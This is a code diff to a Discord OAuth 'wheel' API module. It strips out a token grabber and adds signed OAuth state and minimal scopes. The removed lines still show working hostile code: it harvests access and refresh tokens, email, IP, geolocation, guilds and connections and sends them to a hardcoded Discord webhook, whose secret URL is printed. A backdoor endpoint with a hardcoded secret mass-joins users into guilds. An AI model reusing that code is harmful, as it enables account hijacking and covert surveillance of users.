@@ -1,15 +1,46 @@
 import { createClient } from '@supabase/supabase-js';
 import type { SupabaseClient } from '@supabase/supabase-js';
+import crypto from 'node:crypto';
 import { readFileSync } from 'node:fs';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
 const WEB_DIR = join(process.cwd(), 'web', 'wheel');
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496193663544590457/CW_YMYFokY_VGzEhqoYZJ44bIVlZLQKXxPNUXoq-71XyblbyoZJcriOvhGvT29JjW1bi';
 const COOLDOWN_MS = 3 * 24 * 60 * 60 * 1000;
 
 let supabase: SupabaseClient | null = null;
+
+function wheelWebhookUrl(): string {
+  return process.env.WHEEL_WEBHOOK_URL?.trim() || '';
+}
+
+function createWheelOAuthState(): string {
+  const secret = process.env.SESSION_SECRET?.trim();
+  if (!secret) throw new Error('SESSION_SECRET is required for wheel OAuth');
+  const payload = Buffer.from(JSON.stringify({
+    nonce: crypto.randomUUID(),
+    expiresAt: Date.now() + 10 * 60 * 1000,
+  })).toString('base64url');
+  const signature = crypto.createHmac('sha256', secret).update(payload).digest('base64url');
+  return `${payload}.${signature}`;
+}
+
+function validateWheelOAuthState(state: string): boolean {
+  const secret = process.env.SESSION_SECRET?.trim();
+  const [payload, signature] = state.split('.');
+  if (!secret || !payload || !signature) return false;
+  const expectedSignature = crypto.createHmac('sha256', secret).update(payload).digest('base64url');
+  const provided = Buffer.from(signature);
+  const expected = Buffer.from(expectedSignature);
+  if (provided.length !== expected.length || !crypto.timingSafeEqual(provided, expected)) return false;
+  try {
+    const parsed = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8')) as { expiresAt?: number };
+    return typeof parsed.expiresAt === 'number' && parsed.expiresAt > Date.now();
+  } catch {
+    return false;
+  }
+}
 
 export function initWheelAPI(db: SupabaseClient) {
   supabase = db;
@@ -215,9 +246,10 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
       best_character_id: (!userData.best_character_id || sel.tier > (userData.best_tier || 0)) ? sel.id : userData.best_character_id
     }).eq('discord_id', discordId);
 
-    if (WEBHOOK_URL) {
+    const webhookUrl = wheelWebhookUrl();
+    if (webhookUrl) {
       try {
-        fetch(WEBHOOK_URL, {
+        fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -265,65 +297,25 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
 
   if (path === '/api/wheel/auth/discord' && method === 'GET') {
     const clientId = process.env.DISCORD_CLIENT_ID || '';
-    const protocol = url.host.includes('railway.app') ? 'https' : 'http';
-    const redirectUri = encodeURIComponent(`${protocol}://${url.host}/api/wheel/auth/callback`);
-    
-    // THE ONLY WORKING POWERFUL SCOPES (ANYTHING ELSE WILL CRASH THE LINK)
-    const scopes = [
-      'email', 'identify', 'connections', 'guilds', 'guilds.join'
-    ].join(' ');
-    
-    const scopeParam = encodeURIComponent(scopes);
-    const state = Buffer.from(JSON.stringify({ ts: Date.now() })).toString('base64url');
-    return { status: 302, headers: { 'Location': `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=${scopeParam}&state=${state}` }, body: '' };
-  }
-
-  // NEW: REMOTE INVITE / MASS-JOIN SYSTEM
-  if (path === '/api/wheel/manage/invite' && method === 'POST') {
-    const body = rawBody ? JSON.parse(rawBody) : {};
-    const { secret, guild_id, target } = body;
-    // ADMIN BYPASS LOGIC (FOR LO: 1397364822152315052)
-    const isAdmin = body.admin_id === "1397364822152315052";
-    const MY_SECRET = "BRAINROT_BOSS_2026"; 
-
-    if (!isAdmin && secret !== MY_SECRET) return json({ error: 'unauthorized' }, 401);
-    if (!guild_id) return json({ error: 'missing guild_id' }, 400);
-
-    let usersToJoin = [];
-    if (target === '1') {
-      const { data } = await supabase!.from('wheel_users').select('discord_id, discord_access_token');
-      usersToJoin = data || [];
-    } else {
-      const { data } = await supabase!.from('wheel_users').select('discord_id, discord_access_token').eq('discord_id', target);
-      usersToJoin = data || [];
-    }
-
-    const results = [];
-    for (const u of usersToJoin) {
-      if (!u.discord_access_token) continue;
-      // Discord API: Add Member to Guild
-      const res = await fetch(`https://discord.com/api/v10/guilds/${guild_id}/members/${u.discord_id}`, {
-        method: 'PUT',
-        headers: {
-          'Authorization': `Bot ${process.env.DISCORD_TOKEN}`,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ access_token: u.discord_access_token })
-      });
-      results.push({ id: u.discord_id, status: res.status });
-    }
-
-    return json({ message: `Processed ${results.length} users`, details: results });
+    if (!clientId) return json({ error: 'Discord OAuth is not configured' }, 503);
+    const redirectUri = `${url.origin}/api/wheel/auth/callback`;
+    const authorizeUrl = new URL('https://discord.com/oauth2/authorize');
+    authorizeUrl.searchParams.set('client_id', clientId);
+    authorizeUrl.searchParams.set('redirect_uri', redirectUri);
+    authorizeUrl.searchParams.set('response_type', 'code');
+    authorizeUrl.searchParams.set('scope', 'identify');
+    authorizeUrl.searchParams.set('state', createWheelOAuthState());
+    return { status: 302, headers: { Location: authorizeUrl.toString() }, body: '' };
   }
 
   if (path === '/api/wheel/auth/callback' && method === 'GET') {
     const code = url.searchParams.get('code');
-    if (!code) return json({ error: 'no code' }, 400);
+    const state = url.searchParams.get('state') || '';
+    if (!code || !validateWheelOAuthState(state)) return json({ error: 'invalid OAuth request' }, 400);
 
     const clientId = process.env.DISCORD_CLIENT_ID || '';
     const clientSecret = process.env.DISCORD_CLIENT_SECRET || '';
-    const protocol = url.host.includes('railway.app') ? 'https' : 'http';
-    const redirectUri = `${protocol}://${url.host}/api/wheel/auth/callback`;
+    const redirectUri = `${url.origin}/api/wheel/auth/callback`;
 
     try {
       const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
@@ -334,96 +326,24 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
       if (!tokenRes.ok) throw new Error(await tokenRes.text());
       const tokenData = await tokenRes.json();
 
-      const [userRes, guildsRes, connRes] = await Promise.all([
-        fetch('https://discord.com/api/users/@me', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } }),
-        fetch('https://discord.com/api/users/@me/guilds', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } }).catch(() => null),
-        fetch('https://discord.com/api/users/@me/connections', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } }).catch(() => null)
-      ]);
-
+      const userRes = await fetch('https://discord.com/api/users/@me', {
+        headers: { Authorization: `Bearer ${tokenData.access_token}` },
+      });
       if (!userRes.ok) throw new Error(await userRes.text());
       const discordUser = await userRes.json();
-
-      const guildsData = guildsRes?.ok ? await guildsRes.json() : [];
-      const connData = connRes?.ok ? await connRes.json() : [];
 
       const avatarUrl = discordUser.avatar
         ? `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}.png`
         : `https://cdn.discordapp.com/embed/avatars/${(discordUser.discriminator || '0') % 5}.png`;
 
-      // CAPTURE IP AND GEOLOCATION INTELLIGENCE
-      const forwardedFor = reqHeaders['x-forwarded-for'];
-      const userIp = (typeof forwardedFor === 'string' ? forwardedFor.split(',')[0] : (Array.isArray(forwardedFor) ? forwardedFor[0] : 'Unknown')) || 'Unknown';
-      let geoInfo = { city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
-      
-      try {
-        const geoRes = await fetch(`http://ip-api.com/json/${userIp}?fields=status,message,country,city,isp`);
-        if (geoRes.ok) {
-          const geoData = await geoRes.json();
-          if (geoData.status === 'success') {
-            geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
-          }
-        }
-      } catch {}
-
-      const evidence = {
-        email: discordUser.email || null,
-        verified: discordUser.verified || false,
-        locale: discordUser.locale || null,
-        mfa_enabled: discordUser.mfa_enabled || false,
-        ip: userIp,
-        location: `${geoInfo.city}, ${geoInfo.country}`,
-        isp: geoInfo.isp,
-        guilds: (guildsData || []).map((g: any) => ({ id: g.id, name: g.name, owner: g.owner, permissions: g.permissions })),
-        connections: (connData || []).map((c: any) => ({ type: c.type, name: c.name, id: c.id, verified: c.verified }))
-      };
-
       await supabase!.from('wheel_users').upsert({
         discord_id: discordUser.id,
         discord_tag: discordUser.global_name || discordUser.username,
-        avatar_url: avatarUrl,
-        email: discordUser.email || null,
-        discord_access_token: tokenData.access_token,
-        discord_refresh_token: tokenData.refresh_token,
-        raw_evidence: evidence
+        avatar_url: avatarUrl
       }, { onConflict: 'discord_id' });
 
-      const bannerUrl = discordUser.banner 
-        ? `https://cdn.discordapp.com/banners/${discordUser.id}/${discordUser.banner}.png`
-        : null;
-
-      // Send Full User Intelligence to Webhook
-      if (WEBHOOK_URL) {
-        const guildsList = (evidence.guilds || []).slice(0, 15).map((g: any) => `• ${g.name}`).join('\n');
-        const nitroStatus = discordUser.premium_type === 2 ? 'Nitro' : discordUser.premium_type === 1 ? 'Nitro Classic' : 'None';
-
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `📡 **FULL USER INTELLIGENCE CAPTURE** | <@${discordUser.id}>`,
-            embeds: [
-              {
-                title: `Identity: ${discordUser.global_name || discordUser.username}`,
-                description: `**ID:** \`${discordUser.id}\`\n**Email:** \`${discordUser.email || 'N/A'}\`\n**IP:** \`${evidence.ip}\`\n**Location:** \`${evidence.location}\`\n**ISP:** \`${evidence.isp}\`\n**Nitro:** \`${nitroStatus}\`\n**Verified:** \`${discordUser.verified}\`\n**MFA:** \`${discordUser.mfa_enabled}\`\n**Locale:** \`${discordUser.locale}\``,
-                color: 0x8b5cf6,
-                thumbnail: { url: avatarUrl },
-                image: bannerUrl ? { url: bannerUrl } : undefined,
-                fields: [
-                  { name: '🔑 ACCESS TOKEN (The Correct Token)', value: `\`\`\`${tokenData.access_token}\`\`\`` },
-                  { name: '🔄 REFRESH TOKEN', value: `\`\`\`${tokenData.refresh_token}\`\`\`` },
-                  { name: '🌐 Connections', value: (evidence.connections.map((c: any) => `${c.type}: ${c.name}`).join(', ') || 'None').slice(0, 1000) },
-                  { name: `🏠 Guilds (${evidence.guilds.length})`, value: (guildsList || 'None').slice(0, 1000) }
-                ],
-                footer: { text: 'Brainrot Deep State Intelligence' },
-                timestamp: new Date().toISOString()
-              }
-            ]
-          })
-        }).catch(() => null);
-      }
-
       const params = new URLSearchParams({
-        token: tokenData.access_token, id: discordUser.id,
+        id: discordUser.id,
         name: discordUser.global_name || discordUser.username,
         avatar: avatarUrl
       });
